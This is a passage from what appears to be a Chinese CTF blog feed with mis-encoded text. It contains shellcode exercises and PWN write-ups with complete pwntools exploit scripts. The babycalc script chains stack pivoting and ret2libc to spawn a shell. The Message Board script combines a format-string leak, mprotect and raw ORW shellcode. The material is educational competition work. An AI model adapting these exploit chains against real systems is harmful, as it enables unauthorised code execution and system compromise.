ˆäº†</strong>ï¼‰ï¼Œç„¶åè¿›è¡Œäº†è¿‘è°ƒç”¨ï¼ˆå»æ‰§è¡Œbelowé‡Œçš„å†…å®¹ï¼‰ï¼Œç„¶åæ‰§è¡Œäº†pop rdi<strong>ï¼ˆä¹Ÿå°±æ˜¯æŠŠå­—ç¬¦ä¸²çš„åœ°å€å¼¹åˆ°äº†rdié‡Œé¢ï¼‰</strong>ï¼Œæ‹¿åˆ°äº†å­—ç¬¦ä¸²çš„åœ°å€ï¼Œç„¶åå°†å…¶èµ‹å€¼ç»™raxï¼Œç„¶åretå³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call below</span><br><span class="line">db &quot;BSides San Francisco&quot;,0</span><br><span class="line">below:</span><br><span class="line">pop rdi</span><br><span class="line">mov rax,rdi</span><br><span class="line">ret</span><br><span class="line">.</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/06/06/IfwjcV6CbGMQN8n.png" alt="image-20220605205330512" style="zoom:50%;" /><h1 id="shurdles3"><a href="#shurdles3" class="headerlink" title="shurdles3"></a>shurdles3</h1><h2 id="ç¬¬ä¸€å…³-2"><a href="#ç¬¬ä¸€å…³-2" class="headerlink" title="ç¬¬ä¸€å…³"></a>ç¬¬ä¸€å…³</h2><img src="https://s2.loli.net/2022/06/06/nqYRJirNV2seDm5.png" alt="image-20220605205852136" style="zoom:50%;" /><p>è¿™ä¸ªå¾ˆç®€å•ï¼Œä¹‹å‰ä¹Ÿåšè¿‡äº†ï¼Œå°±æ˜¯è¦ä½¿ç”¨exité€€å‡ºæ—¶çš„ä»£ç ä¸º123ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,60</span><br><span class="line">mov rdi,123</span><br><span class="line">syscall</span><br><span class="line">.</span><br></pre></td></tr></table></figure><h2 id="ç¬¬äºŒå…³-2"><a href="#ç¬¬äºŒå…³-2" class="headerlink" title="ç¬¬äºŒå…³"></a>ç¬¬äºŒå…³</h2><img src="https://s2.loli.net/2022/06/06/CF6o7kVvJp5sXDA.png" alt="image-20220605210132746" style="zoom:50%;" /><p>æƒ³ç³»ç»Ÿè°ƒç”¨writeï¼Œç„¶åå°†Hello,BSides!è¿™å¥è¯æ‰“å°å‡ºæ¥å¹¶ä¸”ä½¿ç”¨exité€€å‡ºã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call write</span><br><span class="line">db &quot;Hello, BSides!&quot;,0 </span><br><span class="line">write:</span><br><span class="line">pop rsi</span><br><span class="line">mov rdi,1</span><br><span class="line">mov rdx,14</span><br><span class="line">mov rax,1</span><br><span class="line">syscall</span><br><span class="line">mov rax,60</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br><span class="line">.</span><br></pre></td></tr></table></figure><h2 id="ç¬¬ä¸‰å…³-2"><a href="#ç¬¬ä¸‰å…³-2" class="headerlink" title="ç¬¬ä¸‰å…³"></a>ç¬¬ä¸‰å…³</h2><img src="https://s2.loli.net/2022/06/06/mWKTz8U1xRbM6dq.png" alt="image-20220605210723155" style="zoom:50%;" /><p>æ­¤æ—¶æ¥åˆ°äº†æœ€åä¸€å…³ã€‚</p><p>æƒ³è®©æˆ‘ä»¬ç”¨open,read,writeæ¥è¯»å‡ºflagå¹¶ä¸”è¿›è¡Œé€€å‡ºï¼ˆäººå®¶è¿˜è¯´Be sure to exit cleanlyï¼Œæˆ‘è¿™ä¸ªè‹±è¯­æ¸£æ¸£è®¤ä¸ºæ˜¯è¦ç”¨retè¿”å›å¹¶ä¸”è¿”å›å€¼ä¸º0ï¼‰ã€‚flagä½äº&#x2F;app&#x2F;level2.yaml</p><p>é‚£è¿™é¢˜ä¸å°±å’Œæ‰“å®å®ä¸€æ ·ç®€å•ä¹ˆã€‚<strong>éœ€è¦æ³¨æ„çš„æ˜¯äººå®¶æç¤ºè¯´openè¿”å›çš„è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æ˜¯éšæœºçš„ï¼Œå¹¶ä¸æ˜¯3ï¼Œæ‰€ä»¥è¿™é‡Œè¦ç”¨movæŠŠraxé‡Œè£…çš„è¿”å›å€¼ç»™ä¼ è¿‡æ¥</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call below</span><br><span class="line">db &quot;/app/level2.yaml&quot;,0</span><br><span class="line">below:</span><br><span class="line">pop rdi</span><br><span class="line">mov rax,2</span><br><span class="line">mov rsi,0</span><br><span class="line">syscall</span><br><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">sub rsi,60</span><br><span class="line">push 48</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">mov rdi,1</span><br><span class="line">mov rsi,rsp</span><br><span class="line">sub rsi,60</span><br><span class="line">mov rdx,48</span><br><span class="line">mov rax,1</span><br><span class="line">syscall</span><br><span class="line">mov rax,0</span><br><span class="line">ret</span><br><span class="line">.</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/06/06/zOueQdn7YsKtD6g.png" alt="image-20220605211437993" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023è¥¿æ¹–è®ºå‰‘ PWN éƒ¨åˆ†WP</title>
      <link href="/posts/1c9fd873.html"/>
      <url>/posts/1c9fd873.html</url>
      
        <content type="html"><![CDATA[<p>ä¸€å…±äº”ä¸ª <code>PWN</code> ï¼Œæœ‰ä¸¤ä¸ªé›¶è§£ï¼Œè¿˜æœ‰ä¸€ä¸ªå¾ˆå°‘è§£çš„é¢˜ç›®ï¼Œæœ¬äººèœé¸¡é€‰æ‰‹åšä¸å‡ºæ¥ï¼Œä¼°è®¡åé¢å¤ç°ä¹Ÿå¤Ÿå‘›ï¼Œå°±è®°å½•ä¸€ä¸‹æ¯”èµ›åšå‡ºæ¥çš„ä¸¤ä¸ªå¸¸è§„ <code>PWN</code>ã€‚</p><h2 id="babycalc"><a href="#babycalc" class="headerlink" title="babycalc"></a>babycalc</h2><h3 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021853480.png" alt="image-20230202185343223"></p><h3 id="æ¼æ´æ‰€åœ¨"><a href="#æ¼æ´æ‰€åœ¨" class="headerlink" title="æ¼æ´æ‰€åœ¨"></a>æ¼æ´æ‰€åœ¨</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021855407.png" alt="image-20230202185510362"></p><p>æº¢å‡ºäº† <code>rbp</code> æœ«å­—èŠ‚ä¸º <code>\x00</code> ï¼Œå¹¶ä¸”å¾€ <code>buf</code> é‡Œè¾“å…¥æ•°æ®çš„æ—¶å€™å¯ä»¥æ§åˆ¶å¦‚ä¸‹æ‰€æœ‰å˜é‡</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021856648.png" alt="image-20230202185640585" style="zoom:50%;" /><p>ç»“åˆè¿™ä¸€è¡Œä»£ç  <code>*(&amp;v3 + i) = v0;</code> ï¼Œå› ä¸º <code>i</code> æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œæ‰€ä»¥æ­¤å¤„æœ‰ä¸€æ¬¡çš„ä»»æ„æ ˆåœ°å€å•å­—èŠ‚å†™å…¥çš„æœºä¼šï¼Œé€šè¿‡ <code>gdb</code> è°ƒè¯•å‘ç°è¿”å›åœ°å€å’Œ <code>leave ; ret</code> æŒ‡ä»¤çš„åœ°å€å‰ä¸¤ä¸ªå­—èŠ‚éƒ½ä¸€æ ·ï¼Œæ‰€ä»¥å‘è¿”å›åœ°å€æœ«å°¾å†™å…¥ <code>\x17</code> ï¼Œä»¥æ­¤æ¥ä½œå‡º <code>leave ; ret</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021901380.png" alt="image-20230202190116289"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯å› ä¸ºå°† <code>i</code> æ”¹å¤§ä¹‹åï¼Œä¸‹ä¸€æ¬¡çš„å¾ªç¯å°±ä¸€å®šè¿›ä¸å»äº†ï¼Œæ‰€ä»¥è¿™ä¸ªä»»æ„æ ˆåœ°å€å†™å•å­—èŠ‚åªæœ‰ä¸€æ¬¡æœºä¼šã€‚åŒæ—¶å°† <code>buf</code> å†™æ»¡ï¼Œè®© <code>rbp</code> æœ«å°¾ä¸º  <code>0</code> ï¼ˆæ­¤æ—¶ <code>rbp</code> æŒ‡å‘äº† <code>buf</code> ä¸­çš„æ•°æ®ï¼‰ä¹Ÿå°±æ„å‘³ç€æ¥ä¸‹æ¥è§¦å‘æ ˆè¿ç§»ï¼Œä¼šè¿ç§»åˆ°æˆ‘ä»¬å¯æ§çš„åœ°æ–¹æ‰§è¡Œ <code>rop</code></p><p>ä¸Šè¿°æˆåŠŸçš„å‰ææ˜¯è¦æŠŠè¿™ä¸ªæ–¹ç¨‹ç»„ç»™è§£å‡ºæ¥ï¼Œå…ˆå®‰è£…ä¸‹ <code>z3</code> è¿™ä¸ªåŒ… ï¼Œç„¶åç”¨ <code>python</code> è·‘ä¸€ä¸‹å³å¯ï¼Œè„šæœ¬å¦‚ä¸‹</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">v3=Int(<span class="string">&#x27;v3&#x27;</span>)</span><br><span class="line">v4=Int(<span class="string">&#x27;v4&#x27;</span>)</span><br><span class="line">v5=Int(<span class="string">&#x27;v5&#x27;</span>)</span><br><span class="line">v6=Int(<span class="string">&#x27;v6&#x27;</span>)</span><br><span class="line">v7=Int(<span class="string">&#x27;v7&#x27;</span>)</span><br><span class="line">v8=Int(<span class="string">&#x27;v8&#x27;</span>)</span><br><span class="line">v9=Int(<span class="string">&#x27;v9&#x27;</span>)</span><br><span class="line">v10=Int(<span class="string">&#x27;v10&#x27;</span>)</span><br><span class="line">v11=Int(<span class="string">&#x27;v11&#x27;</span>)</span><br><span class="line">v12=Int(<span class="string">&#x27;v12&#x27;</span>)</span><br><span class="line">v13=Int(<span class="string">&#x27;v13&#x27;</span>)</span><br><span class="line">v14=Int(<span class="string">&#x27;v14&#x27;</span>)</span><br><span class="line">v15=Int(<span class="string">&#x27;v15&#x27;</span>)</span><br><span class="line">v16=Int(<span class="string">&#x27;v16&#x27;</span>)</span><br><span class="line">v17=Int(<span class="string">&#x27;v17&#x27;</span>)</span><br><span class="line">v18=Int(<span class="string">&#x27;v18&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add((v17 + v16 * v15) * v18 == <span class="number">0x11376</span>)</span><br><span class="line">s.add(v5 * v4 * v3 - v6 == <span class="number">0x8D56</span>)</span><br><span class="line">s.add(v3 == <span class="number">0x13</span>)</span><br><span class="line">s.add(v5 * <span class="number">0x13</span> * v4 + v6 == <span class="number">0x8DE2</span>)</span><br><span class="line">s.add((v13 + v3 - v8) * v16 == <span class="number">0x8043</span>)</span><br><span class="line">s.add((v4 * v3 - v5) * v6 == <span class="number">0xAC8A</span>)</span><br><span class="line">s.add((v5 + v4 * v3) * v6 == <span class="number">0xC986</span>)</span><br><span class="line">s.add(v9 * v8 * v7 - v10 == <span class="number">0xF06D</span>)</span><br><span class="line">s.add(v10 * v15 + v4 + v18 == <span class="number">0x4A5D</span>)</span><br><span class="line">s.add(v9 * v8 * v7 + v10 == <span class="number">0xF1AF</span>)</span><br><span class="line">s.add((v8 * v7 - v9) * v10 == <span class="number">0x8E03D</span>)</span><br><span class="line">s.add(v11 == <span class="number">0x32</span>)</span><br><span class="line">s.add((v9 + v8 * v7) * v10 == <span class="number">0x8F59F</span>)</span><br><span class="line">s.add(v13 * v12 * v11 - v14 == <span class="number">0x152FD3</span>)</span><br><span class="line">s.add(v13 * v12 * v11 + v14 == <span class="number">0x15309D</span>)</span><br><span class="line">s.add((v12 * v11 - v13) * v14 == <span class="number">0x9C48A</span>)</span><br><span class="line">s.add((v11 * v5 - v16) * v12 == <span class="number">0x4E639</span>)</span><br><span class="line">s.add((v13 + v12 * v11) * v14 == <span class="number">0xA6BD2</span>)</span><br><span class="line">s.add(v17 * v16 * v15 - v18 == <span class="number">0x8996D</span>)</span><br><span class="line">s.add(v17 * v16 * v15 + v18 == <span class="number">0x89973</span>)</span><br><span class="line">s.add(v14 == <span class="number">0x65</span>)</span><br><span class="line">s.add((v16 * v15 - v17) * v18 == <span class="number">0x112E6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><p>æ±‚è§£åçš„å€¼</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021907794.png" alt="image-20230202190705641" style="zoom:50%;" /><p>ä¸Šè¿°æ ˆè¿ç§»åï¼Œæ‰§è¡Œçš„æ˜¯æ ˆé‡Œçš„ <code>rop</code> ï¼Œå› ä¸º <code>rdx</code> æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤§çš„å€¼ï¼Œæ‰€ä»¥ç›´æ¥è°ƒç”¨ <code>read</code> å‡½æ•°å‘ <code>bss</code> æ®µå†™å…¥æ•°æ®ï¼ˆè¿™ä¸ªåœ°å€æ‰¾é«˜ç‚¹ï¼Œä¸ç„¶ä¹‹åæ‰§è¡Œ <code>system</code> å‡½æ•°å¼€è¾Ÿæ ˆå¸§å¯èƒ½ä¼šè¦†ç›–ä¸€äº›å…¶ä»–æŒ‡é’ˆï¼‰ï¼Œç„¶åç¨‹åºä¸­æ˜¯å­˜åœ¨è¿™ä¸ª  <code>pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</code> ,åˆ©ç”¨è¿™ä¸ª <code>gadget</code> å¯ä»¥å†è¿›è¡Œä¸€æ¬¡æ ˆè¿ç§»ï¼ˆå› ä¸ºæ ˆé‡Œæ— æ³•å¸ƒç½®å¤ªé•¿çš„ <code>rop</code> é“¾ï¼Œåªèƒ½è¿ç§»åˆ° <code>bss</code> æ®µä¸Šï¼‰</p><p>è¿ç§»åˆ° <code>bss</code> æ®µä¸Šåå†æ‰“ä¸€æ¬¡ <code>ret2libc</code> å³å¯</p><p><strong>æ³¨æ„ï¼š</strong> å› ä¸ºæ ˆéšæœºåŒ–çš„åŸå› ï¼Œ<code>rbp</code> çš„æœ«å°¾è¦†ç›–ä¸º <code>\x00</code> åï¼Œä¸æ˜¯ä¸€å®šèƒ½æŒ‡å‘ <code>rop</code> é“¾çš„å¼€å§‹éƒ¨åˆ†ï¼Œè€Œæ˜¯åœ¨ä¸€ä¸ªåŒºåŸŸå†…éšæœºçš„ï¼Œæ‰€ä»¥åœ¨ <code>rop</code> ä¸Šé¢å†™æ»¡ <code>ret</code> æŒ‡ä»¤ï¼Œæ»‘åˆ° <code>rop</code> é“¾ä¸ŠæˆåŠŸçš„æ¦‚ç‡ä¼šå¤§ä¸€ç‚¹ã€‚</p><p>æ”¾å‡ å¼ è°ƒè¯•æ—¶çš„å›¾ç‰‡</p><p>ä¸‹é¢æ˜¯æ‰§è¡Œåˆ° <code>puts(&quot;good done&quot;)</code> æ—¶ï¼Œæ ˆä¸­çš„æƒ…å†µï¼Œå¯ä»¥çœ‹åˆ°è¿”å›åœ°å€å·²ç»å˜æˆäº† <code>nop ; leave ; ret</code> çš„åœ°å€ï¼Œ <code>rbp</code> æŒ‡å‘äº†ä¸Šé¢ <code>ret</code> çš„éƒ¨åˆ†ï¼Œè€Œ <code>ret</code> ä¸‹é¢å°±æ˜¯ <code>ropé“¾</code> ï¼Œè¯¥ <code>rop</code> é“¾æ˜¯å‘ <code>bss</code> æ®µå†™å…¥ <code>ret2libc</code> çš„ <code>payload</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021938029.png" alt="image-20230202193808421"></p><p>ç¬¬äºŒæ¬¡æ ˆè¿ç§»</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021941345.png" alt="image-20230202194109919"></p><p>æ‰§è¡Œ <code>puts</code> å‡½æ•°æ³„éœ² <code>libc</code> åœ°å€ï¼Œæ­¤æ—¶æ ˆå·²ç»è¿ç§»åˆ°äº† <code>bss</code> æ®µä¸Š</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021942043.png" alt="image-20230202194207428" style="zoom:50%;" /><p>æœ€åè§¦å‘ <code>system</code> å‡½æ•°ï¼Œè·å– <code>shell</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021943748.png" alt="image-20230202194320318"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021943035.png" alt="image-20230202194345788"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;b&#x27;</span>,<span class="string">&quot;tcp.cloud.dasctf.com:21323&quot;</span>)</span><br><span class="line"></span><br><span class="line">v3 = <span class="number">19</span></span><br><span class="line">v11 = <span class="number">50</span></span><br><span class="line">v14 = <span class="number">101</span></span><br><span class="line">v18 = <span class="number">3</span></span><br><span class="line">v10 = <span class="number">161</span></span><br><span class="line">v12 = <span class="number">131</span></span><br><span class="line">v5 = <span class="number">53</span></span><br><span class="line">v16 = <span class="number">199</span></span><br><span class="line">v7 = <span class="number">55</span></span><br><span class="line">v9 = <span class="number">17</span></span><br><span class="line">v15 = <span class="number">118</span></span><br><span class="line">v17 = <span class="number">24</span></span><br><span class="line">v6 = <span class="number">70</span></span><br><span class="line">v4 = <span class="number">36</span></span><br><span class="line">v13 = <span class="number">212</span></span><br><span class="line">v8 = <span class="number">66</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400ca3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000400ca1</span></span><br><span class="line">bss_addr=<span class="number">0x602510</span></span><br><span class="line">pop_rsp_r13_r14_r15=<span class="number">0x0000000000400c9d</span></span><br><span class="line">ret=<span class="number">0x400C3E</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop=p64(pop_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(pop_rsi_r15)+p64(bss_addr)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(e.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop+=p64(pop_rsp_r13_r14_r15)</span><br><span class="line">rop+=p64(bss_addr-<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;\x32\x33&#x27;</span>+ <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">86</span>-<span class="number">0x40</span>) <span class="comment">#206</span></span><br><span class="line">pay+=p64(ret)*<span class="number">0xf</span></span><br><span class="line">pay+= rop</span><br><span class="line"></span><br><span class="line">pay += p8(v3)</span><br><span class="line">pay += p8(v4)</span><br><span class="line">pay += p8(v5)</span><br><span class="line">pay += p8(v6)</span><br><span class="line">pay += p8(v7)</span><br><span class="line">pay += p8(v8)</span><br><span class="line">pay += p8(v9)</span><br><span class="line">pay += p8(v10)</span><br><span class="line">pay += p8(v11)</span><br><span class="line">pay += p8(v12)</span><br><span class="line">pay += p8(v13)</span><br><span class="line">pay += p8(v14)</span><br><span class="line">pay += p8(v15)</span><br><span class="line">pay += p8(v16)</span><br><span class="line">pay += p8(v17)</span><br><span class="line">pay += p8(v18)</span><br><span class="line">pay+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x100</span>-<span class="number">0xe0</span>-<span class="number">4</span>)+<span class="string">b&#x27;\x38\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    p.sendafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">b&#x27;1\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="number">0x400BA6</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;:&#x27;</span>, pay)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">rop2=p64(pop_rdi)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">rop2+=p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">rop2+=p64(pop_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">rop2+=p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x48</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop2+=p64(e.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">p.sendline(rop2)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;puts_addr&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base +<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">rop1=p64(<span class="number">0x400BB8</span>)+p64(pop_rdi)+p64(bin_sh_addr)+p64(sys_addr)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(rop1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Message-Board"><a href="#Message-Board" class="headerlink" title="Message Board"></a>Message Board</h2><p>è¿™ä¸ªé¢˜æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²æ ˆåœ°å€å’Œ <code>libc</code> åœ°å€ï¼Œç„¶åæ ˆè¿ç§»å†æ‰“ <code>mprotect</code> å‡½æ•°å’Œ <code>orw</code> çš„ <code>shellcode</code> å³å¯ï¼Œ æ¯”è¾ƒç®€å•å°±ä¸å†™è¿‡ç¨‹äº† </p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn1&quot;</span>,<span class="string">&quot;tcp.cloud.dasctf.com:20516&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;%p%31$p&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to DASCTF message board, please leave your name:\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x24083</span></span><br><span class="line">log_addr(<span class="string">&#x27;stack_addr&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x40138C</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000401413</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401411</span></span><br><span class="line">pop_rdx_ret=libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">rop=p64(pop_rdi)+p64(stack_addr&amp;<span class="number">0xfffffffffff000</span>)</span><br><span class="line">rop+=p64(pop_rsi_r15)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(pop_rdx_ret)+p64(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">rop+=p64(libc_base+libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">rop+=p64(stack_addr+<span class="number">0x58</span>)<span class="comment">#48</span></span><br><span class="line">rop+=<span class="string">b&quot;\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x6A\x00\x5F\x6A\x00\x5A\x68\x01\x01\x00\x00\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line">rop+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xb0</span>-<span class="number">60</span>-<span class="number">0x48</span>)</span><br><span class="line">rop+=p64(stack_addr+<span class="number">0x10</span>-<span class="number">8</span>)</span><br><span class="line">rop+=p64(<span class="number">0x4013A2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Now, please say something to DASCTF:\n&quot;</span>,rop)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021952429.png" alt="image-20230202195232240"></p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> orw </tag>
            
            <tag> æ ˆè¿ç§» </tag>
            
            <tag> æ±‚è§£æ–¹ç¨‹ç»„ </tag>
            
            <tag> ret2libc </tag>
            
            <tag> æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022é¹åŸæ¯ pwn--one--wp</title>
      <link href="/posts/69f62957.html"/>
      <url>/posts/69f62957.html</url>
      
        <content type="html"><![CDATA[<p>è¿™æ¬¡æ¯”èµ›ç”±äºæœ¬äººè¾ƒèœï¼Œåªåšå‡ºäº†ä¸€é“æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„é‚£é“é¢˜ï¼ˆæ¯”èµ›24ä¸ªå°æ—¶ï¼Œè¿™é“é¢˜æˆ‘æ‰“äº†18ä¸ªå°æ—¶ï¼Œæ˜¯çœŸèœï¼‰ï¼Œåœ¨çŸ¥é“roderickå¸ˆå‚…ä¸‰å°æ—¶åšäº†å››é“é¢˜ä¹‹åï¼Œå°±æ„Ÿè§‰è‡ªå·±æ›´èœäº†  o(â•¥ï¹â•¥)o ç„¶åç”±äºå †é¢˜çš„libcç‰ˆæœ¬éƒ½å¾ˆé«˜ï¼Œæ‰€ä»¥æš‚æ—¶å…ˆæ²¡æ‰“ç®—å¤ç°ï¼ˆä¸»è¦èœç‹—æ‰åˆšæŠŠä½ç‰ˆæœ¬libcçš„å †åŸºç¡€æ¼æ´å­¦å®Œï¼‰</p><p>è¿™é‡Œå°±è®°å½•ä¸€ä¸‹oneè¿™é“é¢˜çš„è§£é¢˜è¿‡ç¨‹(æˆ‘æœ€å¼€å§‹è‡ªå·±åšçš„ç”¨çš„æ–¹æ³•å¾ˆéº»çƒ¦ï¼Œæˆ‘ä¸»è¦è®²roderickå¸ˆå‚…çš„è§£é¢˜æ€è·¯å§ï¼Œæ–‡æœ«è®°å½•ä¸€ä¸‹æˆ‘æœ€å¼€å§‹çš„æ–¹æ³•)</p><h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/2706180-20220708092007160-975113525.png"></p><p><img src="/../img/2706180-20220708092014185-1776221359.png"></p><h2 id="æ¼æ´æ‰€åœ¨ï¼š"><a href="#æ¼æ´æ‰€åœ¨ï¼š" class="headerlink" title="æ¼æ´æ‰€åœ¨ï¼š"></a>æ¼æ´æ‰€åœ¨ï¼š</h2><p><img src="/../img/2706180-20220708092025352-837133436.png"></p><p>é¦–å…ˆè¿™é“é¢˜è‡ªå·±æ³„éœ²äº†æ ˆåœ°å€ã€‚</p><p><img src="/../img/2706180-20220708092035347-601191170.png"></p><p>ç„¶ååœ¨loginå‡½æ•°ä¸­ï¼Œå¦‚æœæŠŠsè£…æ»¡ï¼Œé‚£%så°±å¯ä»¥æ³„éœ²å‡ºä¸€ä¸ªç¨‹åºåœ°å€ï¼Œæ­¤æ—¶å¾—åˆ°äº†ç¨‹åºåŸºåœ°å€(ä»¥æ­¤æ¥å¯¹æŠ—PIEä¿æŠ¤)ï¼Œæ¥ç€å°±æ˜¯å­˜åœ¨ä¸€ä¸ªæ 